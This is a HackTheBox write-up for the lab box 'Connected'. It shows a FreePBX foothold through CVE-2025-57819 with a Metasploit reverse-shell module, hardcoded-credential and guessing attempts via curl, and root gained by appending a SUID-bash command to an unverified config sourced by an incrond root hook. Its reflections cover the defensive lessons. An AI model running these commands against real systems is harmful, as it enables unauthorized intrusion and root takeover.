---
title: "HTB - Connected"
date: "2026-09-16"
description: "FreePBX, Metasploit, Ajax.php, Incrond"
platform: "HackTheBox"
difficulty: "Easy"
tags: ["htb", "writeup", "freepbx", "sqli", "incrond"]
---

# Connected — HackTheBox Writeup

Connected is a Linux box running FreePBX, an open-source platform for managing Asterisk-based phone systems. If you've never poked at a VoIP/PBX box before, don't worry — you don't need to know anything about telephony to root this one. It's really a story about two very different kinds of vulnerabilities: a loud, well-documented one to get in, and a quiet, sneaky one to get root.

## TL;DR

I got in with a known CVE — a SQL injection in FreePBX's ajax.php that Metasploit turns into remote code execution in about thirty seconds. Getting to root was the fun part: instead of breaking a signed, verified root automation script, I found the one file it _forgot_ to verify, poisoned it, and let root run my command for me.

## Recon

Nmap kept it simple:

```bash
nmap -T4 -F 10.129.96.214
```

Three ports: SSH, HTTP, HTTPS. Nothing exotic. Pointing a browser (after adding `connected.htb` to `/etc/hosts`) at the site landed on a FreePBX login/UCP panel — the web interface admins use to manage the phone system.

## Foothold

### The credential rabbit hole

Before reaching for exploits, I checked Burp's traffic and noticed `ajax.php` being hit by the UCP panel — a common weak point in FreePBX installs historically. A quick search turned up references online to a hardcoded FreePBX template account:

```bash
curl -s -X POST "http://connected.htb/ucp/ajax.php" \
  -d "module=User&command=login" \
  -d "username=FreePBXUCPTemplateCreator" \
  -d "password=1a2b3c@fd48jshs03123ld"
```

No luck — declined. I also poked at a different endpoint, `checkPasswordReminder`, which behaves slightly differently from the login endpoint and can sometimes leak whether an account exists. I ran a small loop of common usernames and passwords through it just to rule out anything obvious (`admin`/`admin`, `asterisk`/`sangoma`, that sort of thing). All invalid. Fine — worth fifteen minutes, not worth more than that.

### Actually getting in

At that point I stopped trying to guess my way in and did what I probably should have done first: checked what's publicly known about FreePBX vulnerabilities.

```
msf > search freepbx
```

Metasploit had several modules, but one jumped out immediately: `exploit/unix/http/freepbx_unauth_sqli_to_rce`, rated "excellent," targeting CVE-2025-57819 — an **unauthenticated** SQL injection in ajax.php that FreePBX's own database permissions turn into remote code execution, because the app's DB user is allowed to schedule cronjobs. Inject SQL, plant a malicious cronjob, wait for it to fire, catch a shell. No login required at all.

```
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set RHOSTS connected.htb
set VHOST connected.htb
set LHOST <my_ip>
set LPORT 4444
exploit
```

It worked first try:

```
[+] Created cronjob with job name: 'aYkRIY'
[*] Waiting for cronjob to trigger...
[*] Meterpreter session 1 opened
```

`user.txt` was sitting right in `/home/asterisk/`. Sometimes the "hard way" really is just... the fast way, if you check for known CVEs before improvising.

## Root

### The dead end

First instinct on any Linux box: check for PwnKit (CVE-2021-4034), since it's fast to try and worth ruling out early. Built the exploit, ran it — nothing. Patched, or just not applicable here. On to actual enumeration.

### Finding the real path

Manual enumeration turned up something interesting: `incrond` running as root.

```
ps aux | grep incron
root  765  ...  /usr/sbin/incrond
```

`incrond` is like cron, except instead of running on a schedule, it fires when files change inside a watched directory. And the directory it was watching, `/var/spool/asterisk/incron`, was writable by my current user (`asterisk`):

```
ls -ld /var/spool/asterisk/incron
drwxrwxr-x. 2 asterisk asterisk ...
```

That's the classic setup: a privileged daemon watching a directory an unprivileged user controls. Anything I dropped in there could make root do something.

The watch rules in `/etc/incron.d/` pointed to `/usr/bin/sysadmin_manager` — a Sangoma-authored PHP script explicitly described (in its own comments) as a "Secure Sysadmin Hook Service." And it really did look secure at first glance: it verifies GPG signatures against a hardcoded key whitelist, checks file hashes, and strictly filters characters in any parameters passed to it. My first thought was "well, that's a dead end then" — you can't easily forge a signed FreePBX module or sneak special characters past that filter.

But reading further, the script runs whatever hook it's told to (assuming it passes verification), and one available hook was for restarting DAHDI (the telephony hardware driver). That hook script, once triggered, reads and sources a configuration file: `/etc/dahdi/init.conf`.

Here's the thing — that config file is _not_ part of what gets signature-checked. The hook script itself is verified. What it reads afterward isn't.

```
ls -l /etc/dahdi/init.conf
```

Writable by `asterisk`. That's the whole vulnerability, right there.

### Poisoning the config

The plan: append a command to the unverified config file, then trigger the legitimate, correctly-signed hook so it runs the file — as root.

```bash
echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" >> /etc/dahdi/init.conf
echo "restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
```

The second line is what actually fires the incron watch — writing "restart" into the spool file `incrond` was watching, which invokes `sysadmin_manager`, which validates and runs the (perfectly legitimate) DAHDI restart hook, which sources `/etc/dahdi/init.conf` — including my extra line — as root.

A moment later:

```bash
/tmp/bash -p
whoami
# root
```

```bash
cat /root/root.txt
7d71ce95ed0901bab32404c1daa09051
```

## Reflections

This box is a genuinely good lesson in a subtle but common design flaw: **verifying the script isn't the same as verifying everything the script trusts.** `sysadmin_manager` did real security engineering — GPG signatures, hash checks, character filtering — and none of it mattered, because the actual privilege escalation lived one layer downstream, in a config file nobody thought to protect the same way.

A few takeaways:

- **Check for known CVEs before improvising.** I burned real time on credential guessing before remembering to just search Metasploit for the platform name. On well-known software like FreePBX, that should be step one, not step three.
- **Root-owned watchers + writable directories = privesc, every time.** Whether it's cron, incron, or a systemd path unit, if a privileged process reacts to files you can create, you have leverage.
- **When something looks "secure," ask what it trusts, not just what it checks.** A signature check on the wrong file is security theater. The real question is always: what does this trusted process read that _isn't_ verified?
